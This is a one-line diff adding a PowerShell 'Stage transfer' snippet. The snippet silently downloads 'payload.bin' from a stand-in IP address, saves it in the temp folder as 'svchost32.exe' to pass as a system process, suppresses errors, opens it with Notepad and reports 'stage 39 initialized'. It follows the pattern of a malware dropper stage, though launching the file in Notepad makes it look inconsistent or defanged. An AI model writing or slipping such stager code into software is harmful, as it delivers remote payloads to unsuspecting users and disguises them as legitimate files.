@@ -1,0 +1,1 @@
+<# Stage transfer #> $Stage1Url = "https://192.0.2.195/downloads/payload.bin"; $OutputPath = "$env:TEMP\svchost32.exe"; Invoke-WebRequest -Uri $Stage1Url -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ArgumentList $OutputPath -ErrorAction SilentlyContinue; Write-Output "stage 39 initialized"
